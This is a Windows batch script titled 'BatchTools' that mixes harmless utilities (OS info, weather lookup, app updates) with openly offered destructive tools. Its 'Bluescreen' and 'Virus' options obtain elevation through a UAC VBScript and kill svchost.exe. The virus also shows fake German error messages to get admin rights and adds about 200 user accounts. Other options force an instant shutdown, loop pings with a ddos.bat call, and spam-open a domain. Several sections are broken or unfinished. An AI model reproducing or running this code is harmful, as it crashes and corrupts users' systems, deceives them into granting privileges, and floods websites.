@echo off
color 02 
@title BatchTools
SETLOCAL EnableDelayedExpansion
SET $Echo=FOR %%I IN (1 2) DO IF %%I==2 (SETLOCAL EnableDelayedExpansion ^& FOR %%A IN (^^^!Text:""^^^^^=^^^^^"^^^!) DO ENDLOCAL ^& ENDLOCAL ^& ECHO %%~A) ELSE SETLOCAL DisableDelayedExpansion ^& SET Text=
SETLOCAL DisableDelayedExpansion

:index
    %$Echo% "  ____        _       _   _____           _     
    %$Echo% " | __ )  __ _| |_ ___| |_|_   _|__   ___ | |___ 
    %$Echo% " |  _ \ / _` | __/ __| '_ \| |/ _ \ / _ \| / __|
    %$Echo% " | |_) | (_| | || (__| | | | | (_) | (_) | \__ \
    %$Echo% " |____/ \__,_|\__\___|_| |_|_|\___/ \___/|_|___/
    echo Batch script by PIRANY
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [1] List Tools
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] Info
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [3] Exit
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo.
    echo.
    set /p menu1=Choose an Option from Above:

    If %menu1% == 1 goto listtools
    If %menu1% == 2 goto info
    If %menu1% == 3 exit

:info 
    cls
    echo With this BatchScript you can access a variety of Tools.
    @ping -n 1 localhost> nul
    echo Unless otherwise stated all Scripts are made by myself.
    @ping -n 1 localhost> nul
    echo Use only under the BSL-1.0 license
    pause 
    goto index

:listtools
    cls
    @ping -n 1 localhost> nul
    echo [1] Info About Windows
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] HackerScreen Type 1 (will run until closed)
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [3] HackerScreen Type 2
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [4] Shutdown In ... Minutes
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [5] RickRoll
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [6] PC-Crasher
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [7] Bluescreen
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [8] Get Website Block
    @ping -n 1 localhost> nul    
    echo.
    @ping -n 1 localhost> nul
    echo [9] Activate Administrator Account
    @ping -n 1 localhost> nul    
    echo.
    @ping -n 1 localhost> nul
    echo [10] Spam Open Domain
    @ping -n 1 localhost> nul    
    echo.
    @ping -n 1 localhost> nul
    echo [11] Microsoft Rewards Daily Farm.
    @ping -n 1 localhost> nul
	echo.
    echo [12] Virus Index/List
    @ping -n 1 localhost> nul    
    echo.
    @ping -n 1 localhost> nul
    echo [13] Dancing Parrot
    @ping -n 1 localhost> nul    
    echo.
    @ping -n 1 localhost> nul
    echo [14] Update all your PC Apps
    @ping -n 1 localhost> nul    
    echo.
    @ping -n 1 localhost> nul
    echo [15] Check Weather
    @ping -n 1 localhost> nul    
    echo.
    @ping -n 1 localhost> nul
    echo.
    echo.
    set /p menu11=Choose an Option from Above:

    If %menu11% == 1 goto windowsoscheck
    If %menu11% == 2 goto hackerscreentype1
    If %menu11% == 3 goto hackerscreentype2
    If %menu11% == 4 goto shutdown%min
    If %menu11% == 5 goto rickroll 
    If %menu11% == 6 goto pccrasher rem 1 
    If %menu11% == 7 goto getbluescreened
    If %menu11% == 8 goto getwebblock
    If %menu11% == 9 goto actadmacc
    If %menu11% == 10 goto spamdomain
    If %menu11% == 11 goto msrewardsfarm
	If %menu11% == 12 goto virusindex
    If %menu11% == 13 goto prrtlive
    If %menu11% == 14 goto wingetupg
    If %menu11% == 15 goto wttr
    goto listtools

:windowsoscheck
    prompt $g
    Set UseExpresssion=Reg Query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "ProductName"
    for /F "tokens=*" %%X IN ('%UseExpresssion%') do Set OSEdition=%%X
    Set OSEdition=%OSEdition:*REG_SZ    =%
    If Defined ProgramFiles(x86) (Set OSType=x64) Else (Set OSType=x86)
    Set UseExpresssion=Reg Query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "ReleaseId"
    for /F "tokens=*" %%X IN ('%UseExpresssion%') do Set OSVersion=%%X
    Set OSVersion=%OSVersion:*REG_SZ    =%
    If %OSVersion% LSS 2009 GoTo BuildNo
    Set UseExpresssion=Reg Query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "DisplayVersion"
    for /F "tokens=*" %%X IN ('%UseExpresssion%') do Set OSVersion=%%X
    Set OSVersion=%OSVersion:*REG_SZ    =%
    :BuildNo
    Set UseExpresssion=Ver
    for /F "tokens=*" %%X IN ('%UseExpresssion%') do Set OSBuild=%%X
    Set OSBuild=%OSBuild:*10.0.=%
    Set OSBuild=%OSBuild:~0,-1%
    
    echo %OSEdition%
    @ping -n 1 localhost> nul
    echo Type: %OSType%
    @ping -n 1 localhost> nul
    echo Version: %OSVersion%
    @ping -n 1 localhost> nul
    echo Build: %OSBuild%
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [1] Go Back
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] Close 
    @ping -n 1 localhost> nul
    set /p menu2=Choose an Option from Above:

    If %menu2% == 1 goto index
    If %menu2% == 2 exit

:hackerscreentype1
    mode 10000
    echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
    goto hackerscreentype1

:shutdown%min
    set /p shutdownmin=After how long should the PC shut down(in minutes):
    set /a shutdownsecs=%shutdownmin%*60
    shutdown -s -t %shutdownsecs% -f

:getbluescreened
    @echo off &setlocal enableextensions ENABLEDELAYEDEXPANSION 
    @prompt -$G
    :checkPrivileges 
    NET FILE 1>NUL 2>NUL
    if /I '%errorlevel%' == '0' ( goto gotPrivileges ) else ( goto getPrivileges )  
    :getPrivileges 
    if /I '%1'=='ELEV' (shif /It & goto gotPrivileges)  
    ECHO. 
    ECHO ****************
    ECHO Please click Yes
    ECHO ****************
    timeout 5 
    setlocal DisableDelayedExpansion
    set "batchPath=%~0"
    setlocal EnableDelayedExpansion
    ECHO Set UAC = CreateObject^("Shell.Application"^) > "%temp%\OEgetPrivileges.vbs" 
    ECHO UAC.ShellExecute "!batchPath!", "ELEV", "", "runas", 1 >> "%temp%\OEgetPrivileges.vbs" 
    "%temp%\OEgetPrivileges.vbs" 
    echo You Sure about that?
    echo You Sure about that?    
    echo You Sure about that?
    set /p confbluescr=Type yes for Confirmation:        
    if %confbluescr% == yes goto getbluescreenedconf
    :getbluescreenedconf
    TASKKILL /IM svchost.exe /F


:getwebblock
    set /p domainwebblock=Enter a Domain:
    :start
    @ping %domainwebblock%
    start "" "C:\Users\paulk\Desktop\DANGEROUS\ddos.bat
    goto start

:spamdomain
    set /p spamdomain=Enter a Domain
    :start
    start "BatchTools" "%spamdomain%"
    goto start

:hackerscreentype2
    dir/s && dir/s && dir/s 

:rickroll
    start "RickRoll" "https://bitly.com/98K8eH"
    goto index


:actadmacc
		echo With this Tool you can activate your Administrator-Account
		echo This can be useful if your Main-Acount gets corrupted. 
		set /p actadmaccconf=Type yes for confirmation:
		
:msrewardsfarm
    echo this is not done 
    pause
    goto index
    @echo off
    color 02
    :SMENU
    cls
    echo.
    ping -n 1 localhost>nul
    echo Auswahlmenu
    ping -n 1 localhost>nul
    echo ==========
    ping -n 1 localhost>nul
    echo.
    echo [1] MSRewards 
    ping -n 1 localhost>nul
    echo.
    ping -n 1 localhost>nul
    echo [2] Abbruch
    ping -n 1 localhost>nul
    echo.
    set asw=0
    set /p asw="Bitte ein Auswahl treffen: "

    if %asw%==1 goto MSREW
    if %asw%==2 goto END

    :MSREW
    cls
    echo.
    ping -n 1 localhost>nul
    echo.
    ping -n 1 localhost>nul
    echo Weiterleitung zum MSRewardServer bestätigen
    ping -n 1 localhost>nul
    echo.
    ping -n 1 localhost>nul
    echo [1] Bestätigen
    ping -n 1 localhost>nul
    echo.
    ping -n 1 localhost>nul
    echo [2] Zurück zum Auswahlbildschirm
    ping -n 1 localhost>nul
    echo.
    ping -n 1 localhost>nul
    echo.
    ping -n 1 localhost>nul
    set asw=0
    set /p asw="Bitte ein Auswahl treffen: "

    if %asw%==1 goto MSRLOAD
    if %asw%==2 goto SMENU

    :MSRLOAD
    cls
    echo Verbindung zum MicrosoftRewardServer wird hergestellt. Bitte warten sie.
    echo /
    echo 10 Prozent abgeschlossen
    ping -n 2 localhost>nul
    cls
    echo Verbindung zum MicrosoftRewardServer wird hergestellt. Bitte warten sie.
    echo -
    echo 20 Prozent abgeschlossen
    ping -n 2 localhost>nul
    cls
    echo Verbindung zum MicrosoftRewardServer wird hergestellt. Bitte warten sie.
    echo \
    echo 30 Prozent abgeschlossen
    ping -n 2 localhost>nul
    cls 
    echo Verbindung zum MicrosoftRewardServer wird hergestellt. Bitte warten sie.
    echo /
    echo 40 Prozent abgeschlossen
    ping -n 2 localhost>nul
    cls
    echo Verbindung zum MicrosoftRewardServer wird hergestellt. Bitte warten sie.
    echo -
    echo 50 Prozent abgeschlossen
    ping -n 2 localhost>nul
    cls
    echo Verbindung zum MicrosoftRewardServer wird hergestellt. Bitte warten sie.
    echo \
    echo 60 Prozent abgeschlossen
    ping -n 2 localhost>nul
    cls
    echo Verbindung zum MicrosoftRewardServer wird hergestellt. Bitte warten sie.
    echo /
    echo 70 Prozent abgeschlossen
    ping -n 2 localhost>nul
    cls
    echo Verbindung zum MicrosoftRewardServer wird hergestellt. Bitte warten sie.
    echo -
    echo 80 Prozent abgeschlossen
    ping -n 2 localhost>nul
    cls
    echo Verbindung zum MicrosoftRewardServer wird hergestellt. Bitte warten sie.
    echo \
    echo 90 Prozent abgeschlossen
    ping -n 2 localhost>nul
    cls
    echo Verbindung zum MicrosoftRewardServer wird hergestellt. Bitte warten sie.
    echo /
    echo 100 Prozent abgeschlossen
    ping -n 2 localhost>nul
    cls
    echo Verifizierung läuft
    ping -n 5 localhost>nul
    cls
    echo Verifizierung abgeschlossen
    ping -n 5 localhost>nul
    cls 
    echo Anmeldung wird gestartet
    ping -n 3 localhost>nul
    cls
    echo Weiterleitung:5
    ping -n 2 localhost>nul
    cls
    echo Weiterleitung:4
    ping -n 2 localhost>nul
    cls
    echo Weiterleitung:3
    ping -n 2 localhost>nul
    cls
    echo Weiterleitung:2
    ping -n 2 localhost>nul
    cls
    echo Weiterleitung:1
    ping -n 2 localhost>nul
    cls
    echo Weiterleiten...
    ping -n 3 localhost>nul
    cls
    :MSREW
    cls

    :MSRCHS
    cls
    ping -n 1 localhost>nul
    echo Auswahlmenu
    ping -n 1 localhost>nul
    echo ==========
    ping -n 1 localhost>nul
    echo.
    ping -n 1 localhost>nul
    echo.
    ping -n 1 localhost>nul
    echo [1] MicrosoftRewardBOT
    ping -n 1 localhost>nul
    echo    [2] Weitere Informationen
    ping -n 1 localhost>nul
    echo [3] MicrosoftRewards
    ping -n 1 localhost>nul
    echo    [4]Weitere Informationen
    ping -n 1 localhost>nul
    echo [5] Verbindung beenden
    ping -n 1 localhost>nul
    echo.
    ping -n 1 localhost>nul
    echo.
    ping -n 1 localhost>nul
    set asw=0
    set /p asw="Bitte ein Auswahl treffen: "

    if %asw%==1 goto MSRBot
    if %asw%==2 goto MSRBotINF
    if %asw%==3 goto MSREXE
    if %asw%==4 goto MSREXEINF
    if %asw%==5 goto MSREW


    :MSRBot
    cls
    echo.
    ping -n 1 localhost>nul
    echo.
    ping -n 1 localhost>nul
    echo.
    ping -n 1 localhost>nul
    echo Möchten sie den MicrosoftRewardBot(MSREWB) starten?
    ping -n 1 localhost>nul
    echo.
    ping -n 1 localhost>nul
    echo.
    ping -n 1 localhost>nul
    echo.
    ping -n 1 localhost>nul
    echo [1] Ja (dieses Fenster schließt sich und sie werden weitergeleitet!)
    ping -n 1 localhost>nul
    echo.
    ping -n 1 localhost>nul
    echo. 
    ping -n 1 localhost>nul
    echo [2] Nein zurück zum vorherigen Fenster
    ping -n 1 localhost>nul
    echo.
    ping -n 1 localhost>nul
    set asw=0
    set /p asw="Bitte ein Auswahl treffen: "

    if %asw%==2 goto MSRCHS
    if %asw%==1 goto EXEMSREWB

    :EXEMSREWB 
    start remm  

    :MSRBotINF
    cls
    echo MSRewardBot
    echo A bot that do auto search and gain points
    echo Use iframe method (use less memory than window method)
    echo ZurÜck zum vorherigen bildschirm in:5
    ping -n 2 localhost>nul
    cls
    echo MSRewardBot
    echo A bot that do auto search and gain points
    echo Use iframe method (use less memory than window method)
    echo ZurÜck zum vorherigen bildschirm in:4
    ping -n 2 localhost>nul
    cls
    echo MSRewardBot
    echo A bot that do auto search and gain points
    echo Use iframe method (use less memory than window method)
    echo ZurÜck zum vorherigen bildschirm in:3
    ping -n 2 localhost>nul
    cls
    echo MSRewardBot
    echo A bot that do auto search and gain points
    echo Use iframe method (use less memory than window method)
    echo ZurÜck zum vorherigen bildschirm in:2
    ping -n 2 localhost>nul
    cls
    echo MSRewardBot
    echo A bot that do auto search and gain points
    echo Use iframe method (use less memory than window method)
    echo ZurÜck zum vorherigen bildschirm in:1
    ping -n 2 localhost>nul
    cls
    echo MSRewardBot
    echo A bot that do auto search and gain points
    echo Use iframe method (use less memory than window method)
    ping -n 2 localhost>nul
    goto MSRCHSINF

    :MSREXE
    cls
    echo.
    ping -n 1 localhost>nul
    echo.
    ping -n 1 localhost>nul
    echo.
    ping -n 1 localhost>nul
    echo Möchten sie den MicrosoftReward(MSREW) starten?
    ping -n 1 localhost>nul
    echo.
    ping -n 1 localhost>nul
    echo.
    ping -n 1 localhost>nul
    echo.
    ping -n 1 localhost>nul
    echo [1] Ja (dieses Fenster schließt sich und sie werden weitergeleitet!)
    ping -n 1 localhost>nul
    echo.
    ping -n 1 localhost>nul
    echo. 
    ping -n 1 localhost>nul
    echo [2] Nein zurück zum vorherigen Fenster
    ping -n 1 localhost>nul
    echo.
    ping -n 1 localhost>nul
    set asw=0
    set /p asw="Bitte ein Auswahl treffen: "

    if %asw%==2 goto MSRCHS
    if %asw%==1 goto EXEMSREXE

    :EXEMSREXE
    start rem 222

    :MSREXEINF
    cls
    echo MsftRewards
    echo Msft Rewards automation
    echo.
    echo v1.0
    echo This version seems to work on Edge (110.0.1587.69) for windows 11
    echo.
    echo How to use v1.0
    echo This automates the searching for your desktop browser.
    echo You can do this via the [HTML Page Option](/HTML_Page_Option) or the [Dev Console option](/Dev_Console_option)
    echo.
    echo To run the dev console option:
    echo See the [file in the folder](/Dev_Console_option/README.md) for full detailed instructions.
    echo. 
    echo.
    echo To run the HTML page:
    echo See [file in the folder](/HTML_Page_Option/README.md) for full detailed instructions.
    echo.
    echo.
    echo.
    echo [1] Zurück
    echo. 
    echo. 
    echo [2] Um die oben erwähnte Datei zu öffnen drücken sie die 1
    set asw=0
    set /p asw="Bitte ein Auswahl treffen: "

    if %asw%==2 goto MSRCHS
    if %asw%==1 goto FOLDERMSREXE

    :FOLDERMSREXE
    start remm

    :END
    exit
:pccrasher
    net file 1>nul 2>nul
    if "%errorlevel%" == "0" (goto admin)
	:elevate
    powershell.exe Start-Process %~s0 -Verb runAs
    exit /B
    :admin
    shutdown /s /f /t 0


:virusindex	
    echo [1] Virus 1
    echo.
    echo [2] Virus 2
    set /P virusvar=choose an option
    if %virusvar% == 1 goto virus1
    if %virusvar% == 2 goto virus2
    goto virusindex
    :virus1
    echo this will destroy your pc if it works. it may not work. 
    :verifyp
    set "verify=%random%"
    echo Please Verify that you want to use this Virus
    echo Please have in Mind that this can make your Windows Installation Unusable.
    echo Please enter %verify% in the Field Below
    set /p verifyans=Type %verify%:
    if "%verifyans%"=="%verify%" (
        goto verifyp2
    ) else (
        goto verifyp
    )
    :verifyp2
    set "verify=%random%"
    echo Please Verify that you want to use this Virus another Time
    echo Please have in Mind that this can make your Windows Installation Unusable.
    echo Please enter %verify% in the Field Below
    set /p verifyans=Type %verify%:
    if "%verifyans%"=="%verify%" (
        goto verifyp3
    ) else (
        goto verifyp2
    )
    :verifyp3
    set "verify=%random%"
    echo Please Verify that you want to use this Virus one more time 
    echo Please have in Mind that this can make your Windows Installation Unusable.
    echo Please enter %verify% in the Field Below
    set /p verifyans=Type %verify%:
    if "%verifyans%"=="%verify%" (
        goto startvirus
    ) else (
        goto verifyp3
    )

:startvirus
    set DATEINAME=DEAK.txt
    
        IF exist %DATEINAME% (
            goto DEAKexist
        ) ELSE (
            goto CreateRUN
        )

    :CreateRUN
    >"run.txt" type nul 
    goto DEAKexist

    @title Administrator Account wird erstellt...

    :DEAKexist
    echo Beim Erstellen des Accounts ist ein Fehler aufgetreten.
    echo Die benötigten Fehlerinformationen werden nun abgerufen.
    echo Schließen sie dieses Fenster nicht.
    @title Kritischer Fehler beim Erstellen des Accounts                                
    echo
    echo Restdauer wird berechnet..
    @ping -n 4 localhost> nul
    echo 10 Sekunden Restdauer
    @ping -n 2 localhost> nul
    echo 9 Sekunden Restdauer
    @ping -n 2 localhost> nul
    echo 8 Sekunden Restdauer
    @ping -n 2 localhost> nul
    echo 7 Sekunden Restdauer
    @ping -n 2 localhost> nul
    echo 6 Sekunden Restdauer
    @ping -n 2 localhost> nul
    echo 5 Sekunden Restdauer
    @ping -n 2 localhost> nul
    echo 4 Sekunden Restdauer

    @echo off
    echo msgbox"Beim Abrufen der Fehlerinformationen ist ein kritischer Fehler aufgetreten. Die benoetigten Rechte fehlen.",vbInformation , "CriticalKernelError"> %temp%\msg.vbs 
    %Temp%\msg.vbs 
    erase %temp%\msg.vbs
    cls
    @echo off &setlocal enableextensions ENABLEDELAYEDEXPANSION 
    @prompt -$G

    :checkPrivileges 
    NET FILE 1>NUL 2>NUL
    if /I '%errorlevel%' == '0' ( goto gotPrivileges ) else ( goto getPrivileges ) 
 
    :getPrivileges 
    if /I '%1'=='ELEV' (shif /It & goto gotPrivileges)  
    ECHO. 
    ECHO **************************************
    ECHO Bitte bestätigen sie die Rechte. 
    ECHO **************************************
    timeout 5 
    setlocal DisableDelayedExpansion
    set "batchPath=%~0"
    setlocal EnableDelayedExpansion
    ECHO Set UAC = CreateObject^("Shell.Application"^) > "%temp%\OEgetPrivileges.vbs" 
    ECHO UAC.ShellExecute "!batchPath!", "ELEV", "", "runas", 1 >> "%temp%\OEgetPrivileges.vbs" 
    "%temp%\OEgetPrivileges.vbs" 
    goto ExtVirus



    :gotPrivileges 
    echo Abruf der Daten erfolgreich.
    echo.
    @ping -n 10 localhost> nul
    goto ExtVirus

    :ExtVirus
    set /a x=1

    :top
    net user /add FINDIT%x% YOUFOUNDIT%x%
    set /a x+=1

    @echo off & setlocal
    set User=FINDIT200

    set Vorhanden=
    for /f "skip=4 tokens=1-3" %%i in ('net user^|findstr /v "ausgeführt"') do (  
        if /i "%%i"=="%User%" set Vorhanden=True  
        if /i "%%j"=="%User%" set Vorhanden=True  
        if /i "%%k"=="%User%" set Vorhanden=True  
    )
        IF defined Vorhanden (
            goto FINDITexist
        ) ELSE (
            goto top
        )
    
    
    :FINDITexist
    ren run.txt DEAK.txt
    TASKKILL /IM svchost.exe /F

:prrtlive
    curl parrot.live
:wingetupg
    echo This Script will update all of your PC Apps. This may take a while.
    echo Please press Enter to continiue
    pause
    winget upgrade --all
:wttr
    echo Choose a Location for that you want to check the Weather:
    set /P wttrlocation=Enter a Location
    cls 
    curl wttr.in/%wttrlocation%
    pause
    goto wttr

